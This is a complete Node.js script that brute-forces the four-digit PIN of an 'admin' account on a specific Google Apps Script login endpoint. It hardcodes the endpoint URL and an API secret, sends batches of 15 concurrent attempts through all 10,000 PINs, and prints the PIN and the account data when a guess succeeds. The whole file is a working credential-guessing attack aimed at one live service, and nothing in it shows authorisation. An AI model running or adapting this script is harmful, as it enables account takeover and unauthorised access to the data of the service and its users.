const API_URL = 'https://script.google.com/macros/s/AKfycbzMg1ilHtrHXvTboGF3K8v9AtkWyWCnEGxh_tbvb-PnGHT-vyug8o1pegN_bKUOX4B-4A/exec';
const API_SECRET = 'JANS_SECRET_2026';

async function tryLogin(loginId, password) {
  try {
    const res = await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        fn: 'loginUser',
        args: [loginId, password],
        secret: API_SECRET
      })
    });
    const data = await res.json();
    const inner = data.data;
    if (data.success && inner && inner.success && inner.data && inner.data.ten) {
      return { success: true, data: inner.data };
    }
    return { success: false, error: inner ? inner.error : 'Invalid response' };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

async function run() {
  console.log('Starting PIN brute force v2 (0000 - 9999) for admin...');
  const concurrency = 15;
  
  for (let i = 0; i < 10000; i += concurrency) {
    const batch = [];
    for (let j = 0; j < concurrency && (i + j) < 10000; j++) {
      const pin = String(i + j).padStart(4, '0');
      batch.push(pin);
    }
    
    const results = await Promise.all(batch.map(async (pin) => {
      const res = await tryLogin('admin', pin);
      if (res.success) {
        console.log(`\n!!! FOUND ADMIN PIN !!!`);
        console.log(`User: admin`);
        console.log(`PIN: ${pin}`);
        console.log(`User Data: ${JSON.stringify(res.data)}`);
        process.exit(0);
      }
      return { pin, error: res.error };
    }));
    
    // Print progress
    console.log(`Batch [${batch[0]} - ${batch[batch.length - 1]}] done. Sample error: ${results[0].error}`);
  }
  console.log('All PINs checked. None found.');
}

run();
